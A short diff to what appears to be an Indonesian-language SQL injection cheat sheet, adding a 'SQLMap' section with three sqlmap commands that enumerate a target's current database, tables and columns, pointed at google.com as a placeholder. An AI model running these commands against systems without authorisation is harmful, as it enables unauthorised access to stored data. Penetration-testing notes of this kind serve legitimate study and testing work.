@@ -32,6 +32,15 @@
 - Parameter GET
 - Parameter POST
 
+## SQLMap
+- Menggali isi DB
+    ```
+    sqlmap -u 'http://google.com' --current-db
+    sqlmap -u 'http://google.com' -D <namaDB> --tables
+    sqlmap -u 'http://google.com' -D <nameDB> -T <namaTable> --columns
+    ```
+- 
+
 ## Payload
 |Payload|Payload alternatif|
 |---|---|
